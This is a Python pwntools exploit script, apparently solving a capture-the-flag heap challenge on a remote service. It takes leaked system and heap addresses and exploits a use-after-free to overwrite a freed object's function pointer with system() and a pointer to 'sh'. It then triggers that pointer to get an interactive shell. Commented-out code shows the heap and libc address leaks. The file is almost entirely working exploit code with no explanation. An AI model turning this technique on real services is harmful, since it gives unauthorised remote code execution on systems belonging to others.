from pwn import *

# r = process('./chal')
r = remote('10.113.184.121', 10057)
context.arch = 'amd64'

def register(idx):
    r.recvuntil(b'choice: ')
    r.send(b'1')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

def delete(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())

def set_name(idx, len, name):
    r.recvuntil(b'choice: ')
    r.send(b'3')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())
    r.recvuntil(b'Length: ')
    r.send(str(len).encode())
    r.recvuntil(b'Name: ')
    r.send(name)

def trigger_event(idx):
    r.recvuntil(b'choice: ')
    r.send(b'4')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode())


# Fetch Info
r.recvuntil(b'gift1: ')
system_addr = int(r.recvline()[:-1], 16)
r.recvuntil(b'gift2: ')
heap_addr_leak = int(r.recvline()[:-1], 16)

log.info(f'System Address = {hex(system_addr)}')
log.info(f'Heap Address = {hex(heap_addr_leak)}')

# Exploit Payload
sh_addr = heap_addr_leak + 0x60
register(0)
register(1)
set_name(1, 0x10, b"sh\x00")
delete(0)
set_name(1, 0x18, p64(0) + p64(sh_addr) + p64(system_addr))

trigger_event(0)



## Leak heap address
# register(0)
# register(1)
# register(2)
# raw_input()
# delete(0)
# delete(1)
# raw_input()
# set_name(2, 0x18, b'a')
# raw_input()
# trigger_event(2)
# r.recvuntil(b'Name: ')
# leak_heap = u64(r.recv(6).ljust(0x8, b'\x00'))
# heap_base = leak_heap - 0x261
# log.success(f'Leak heap address = {hex(leak_heap)}')
# log.success(f'Heap base address = {hex(heap_base)}')

## Leak libc address
# for i in range(0x9):
#     register(i)
#     set_name(i, 0x88, b'a')
# raw_input()
# for i in range(0x9):
#     delete(i)
# raw_input()
# for i in range(0x8):
#     register(i)
#     set_name(i, 0x88, b'a')
# raw_input()
# trigger_event(7)
# r.recvuntil(b'Name: ')
# leak_libc = u64(r.recv(6).ljust(0x8, b'\x00'))
# libc_base = leak_libc - 0x1ecc61
# system_addr = libc_base + 0x52290
# log.success(f'Leak libc address = {hex(leak_libc)}')
# log.success(f'Libc base address = {hex(libc_base)}')
# log.success(f'System address = {hex(system_addr)}')
r.interactive()